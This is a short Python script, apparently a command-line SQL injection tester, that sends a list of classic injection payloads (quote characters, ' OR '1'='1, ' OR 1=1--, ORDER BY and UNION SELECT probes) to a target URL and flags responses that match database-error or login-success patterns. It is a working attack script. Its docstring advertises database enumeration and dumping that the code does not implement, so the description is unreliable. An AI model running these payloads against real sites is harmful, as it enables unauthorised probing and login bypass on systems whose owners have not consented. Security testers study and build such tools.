"""SQL injection tester — basic detection + DB enum.
Usage: python sqli_tester.py --target URL [--detect] [--dbs] [--dump]
"""
import urllib.request, urllib.parse, sys, os, re

PAYLOADS = [
    ("'", "sql error|warning|mysql|sqlite|postgresql|ora-"),
    ("\"", "sql error|warning|mysql|sqlite"),
    ("' OR '1'='1", "admin|welcome|dashboard"),
    ("' OR 1=1--", ""),
    ("1' AND '1'='1", ""),
    ("1' AND '1'='2", ""),
    ("1 ORDER BY 10--", "unknown column|order by"),
    ("1 UNION SELECT 1,2,3--", ""),
]

def test_sqli(url, param="id"):
    results = []
    for payload, pattern in PAYLOADS:
        try:
            u = url.replace("PARAM", urllib.parse.quote(payload))
            if "PARAM" not in u:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                new_qs = urllib.parse.urlencode(qs, doseq=True)
                u = parsed._replace(query=new_qs).geturl()
            
            req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read(10000).decode(errors="replace").lower()
            
            if pattern and re.search(pattern, body, re.I):
                results.append(("VULN", payload, f"Pattern match: {pattern}"))
            elif not pattern and resp.status == 200 and len(body) > 500:
                results.append(("INFO", payload, f"Response: {resp.status}, {len(body)}B"))
        except Exception as e:
            pass
    
    return results

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--detect", action="store_true")
    ap.add_argument("--dbs", action="store_true")
    ap.add_argument("--output", default="")
    args = ap.parse_args()

    print(f"\n[SQLI TEST] {args.target}\n")
    
    if args.detect:
        print("  Testing payloads...")
        findings = test_sqli(args.target)
        for level, payload, info in findings:
            print(f"  [{level}] {payload[:30]:<30} {info}")
        print(f"\n  {len(findings)} findings")
    
    if args.output:
        os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
        with open(args.output, "w") as f:
            f.write(f"SQLi Test: {args.target}\n")
